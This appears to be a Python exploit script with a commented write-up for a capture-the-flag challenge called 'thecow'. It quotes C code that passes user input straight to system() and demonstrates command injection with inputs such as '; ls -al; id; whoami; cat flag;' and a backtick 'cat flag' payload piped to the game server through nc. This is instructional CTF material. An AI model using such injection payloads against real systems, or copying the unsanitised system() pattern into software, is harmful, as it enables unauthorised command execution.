'''
fgets(message, 256, stdin);
snprintf(cmd, 1024, "/usr/games/cowsay -%c %s", cow_face[rand()%8], message);
system(cmd);


Above three lines of code are most important part.

User input(message) is passed directly to cmd variable and system function execute it!

Therefore, it means that we can inject any system command. (e.g. ls, cat, id, whoami, etc ...)

For example, if we input "l34p; ls -al; id; whoami; cat flag;" system execute "/usr/games/cowsay -w l34p; ls -al; id; whoami; cat flag;"

Results will looks below.



What does the cow say!

1. Cow fortune
2. Cow time
3. Cow echo
4. Exit

Select: 3
What do you want to say? l34p; ls -al; id; whoami; cat flag;
 ______
< l34p >
 ------
        \   ^__^
         \  (**)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
합계 36
drwxr-xr-x 2 thecow thecow  4096 10월 28 19:06 .
drwxr-xr-x 9 root   root    4096 10월 28 18:11 ..
-r-------- 1 thecow thecow    32 10월 28 17:59 flag
-r-xr-xr-x 1 thecow thecow   380 10월 28 18:37 run.sh
-rwxr-xr-x 1 thecow thecow 13616 10월 28 17:18 thecow
-r--r--r-- 1 thecow thecow  1479 10월 28 17:10 thecow.c
uid=1006(thecow) gid=1006(thecow) 그룹들=1006(thecow)
thecow
C0mm4nd 1nj3ctiOn! Great JOB :)

What does the cow say!

1. Cow fortune
2. Cow time
3. Cow echo
4. Exit

Select:
'''
payload = ""
payload+= "3\n"		 # Select "3. Cow echo"
payload+= "`cat flag`\n" # System command injection! Get the flag.

print payload

# (python exploit.py; cat) | nc play.hexa.pro 7777

'''
What does the cow say!

1. Cow fortune
2. Cow time
3. Cow echo
4. Exit

Select: 3
What do you want to say? `cat flag`
 _________________________________
< C0mm4nd 1nj3ctiOn! Great JOB :) >
 ---------------------------------
        \   ^__^
         \  ($$)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

What does the cow say!

1. Cow fortune
2. Cow time
3. Cow echo
4. Exit

Select: 4
 ______
< bye~ >
 ------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
'''
